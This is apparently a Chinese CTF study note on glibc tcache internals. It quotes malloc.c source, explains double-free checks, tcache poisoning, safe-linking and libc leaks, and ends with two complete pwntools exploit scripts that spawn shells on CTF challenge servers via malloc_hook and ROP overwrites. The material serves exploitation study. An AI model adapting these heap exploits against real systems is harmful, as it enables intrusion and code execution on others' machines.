<h2 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 2927*/</span></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<h2 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 2932*/</span></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">char</span> tcache_shutting_down = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>tcache_perthread_struct位于堆开头的位置，大小为0x250，counts数组用于存放每个bin中的chunk数量，entries数组则是用于存放64个bin的地址</p>
<h2 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 2946*/</span></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tcache_put函数用于将符合tcache bins条件的chunk放入对应的bin中，从第一句可以看出，放入tcache bin中的chunk与fast bin中不同的是，tcache存放的是chunk的mem，即用户使用的data区域，chunk的fd指针指向的也是mem地址</p>
<p>chunk的插入操作也是采用头插法，每插入一个记录chunk数量的count位+1</p>
<h2 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 2958*/</span></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tcache_get函数用于完成tcache bin中chunk的取出，通过源码可以看到和fast bin一样也是从头部开始取，即也是先入后出的链式结构</p>
<p>取出时会将对应bin中的count位减一</p>
<h1 id="与tcache-bin相关的利用思路"><a href="#与tcache-bin相关的利用思路" class="headerlink" title="与tcache bin相关的利用思路"></a>与tcache bin相关的利用思路</h1><h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><h3 id="libc2-29以前"><a href="#libc2-29以前" class="headerlink" title="libc2.29以前"></a>libc2.29以前</h3><p>在libc2.29以前是没有对放入tcache bin中的chunk进行double free检查的，也就是说我们可以直接释放两次同一个堆块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgtu.com/i/jlYQ5q"><img src="https://s1.ax1x.com/2022/07/01/jlYQ5q.jpg" alt="jlYQ5q.jpg"></a></p>
<p>同一个堆块被释放进tcache bin中</p>
<h3 id="libc2-29之后"><a href="#libc2-29之后" class="headerlink" title="libc2.29之后"></a>libc2.29之后</h3><p>libc2.29之后加入了key字段用于double free的检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 2904*/</span></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在_int_free()函数中会判断即将释放的堆块是否存在key字段指向tcache的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 4197*/</span></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>修改chunk的fd指针达到任意地址读写的目的，比fast bin attack更简单的是，tcache没有size字段的检查，也就是不需要伪造size字段</p>
<p>需要注意的是2.32加入下面宏定义对fd指针机进行异或操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tcache_put和tcache_get分别用宏定义对fd进行的加密和解密，所以2.32开始伪造fd的时候需要进行相应的异或操作</p>
<h2 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h2><p>在2.23下我们可以直接释放一个属于unsorted bin大小的chunk用于泄露libc，有了tcache机制后，想要通过unsorted bin泄露libc的话就需要先填满对应tcache bin，再释放才能进入unsorted bin中，或者直接释放一个0x410大小的chunk(64位下)</p>
<h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><p>如果可以分配到tcache_perthread_strcut，我们就可以改写所有tcache bin中的count位和对应bin中的地址，填满count位让我们泄露libc变得更轻松，改写对应地址能将任意地址链入链表中到达任意地址读写的目的</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="VN2020-easyTHeap"><a href="#VN2020-easyTHeap" class="headerlink" title="VN2020 easyTHeap"></a>VN2020 easyTHeap</h2><p>libc2.27</p>
<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p><a href="https://imgtu.com/i/jAb62j"><img src="https://s1.ax1x.com/2022/06/26/jAb62j.jpg" alt="jAb62j.jpg"></a></p>
<p><a href="https://imgtu.com/i/jAbjZ6"><img src="https://s1.ax1x.com/2022/06/26/jAbjZ6.jpg" alt="jAbjZ6.jpg"></a></p>
<p>free之后指针没有置零，uaf，限制了free次数为3次</p>
<p><a href="https://imgtu.com/i/jAqZo8"><img src="https://s1.ax1x.com/2022/06/26/jAqZo8.jpg" alt="jAqZo8.jpg"></a></p>
<p>只能申请7个堆块，最大为0x100</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li>double free拿到tcache struct，将所有tcache的count位填满，再free一个unsorted bin大小的堆块即可泄露libc，至此free次数以用完</li>
<li>编辑tcache改几个链表头打malloc_hook即可</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn2&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">27435</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x10</span> - <span class="number">0x250</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>, p64(heap + <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#3 tcache</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">malloc_hook = uu64() - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">libcbase = malloc_hook - <span class="number">0x3EBC30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">one = libcbase + <span class="number">0x4f322</span></span><br><span class="line">realloc = libcbase + <span class="number">0x98C30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(malloc_hook - <span class="number">0x13</span>) * <span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x40</span>)   <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">11</span>+ p64(one) + p64(realloc + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="ciscn2022-华东北赛区duck"><a href="#ciscn2022-华东北赛区duck" class="headerlink" title="ciscn2022 华东北赛区duck"></a>ciscn2022 华东北赛区duck</h2><p>2.34 uaf , 打environ泄露栈地址，覆盖返回地址为system(“&#x2F;bin&#x2F;sh”)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28060</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;Content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add()               <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">96</span> - libc.sym[<span class="string">&#x27;main_arena&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sh = libcbase + <span class="number">0x1B4689</span></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2daa2</span></span><br><span class="line">environ = libcbase + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()               <span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">8</span>, p64(environ ^ key))</span><br><span class="line">add()   <span class="comment">#14</span></span><br><span class="line">add()   <span class="comment">#15 environ</span></span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">stack = uu64() - <span class="number">0x150</span>      <span class="comment">#ret_addr</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">8</span>, p64(stack - <span class="number">0x18</span> ^ key))</span><br><span class="line"></span><br><span class="line">add() <span class="comment">#16</span></span><br><span class="line">add()   <span class="comment">#17 ret_addr</span></span><br><span class="line">edit(<span class="number">17</span>, <span class="number">0x30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(pop_rdi) + p64(sh) + p64(sys_addr))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
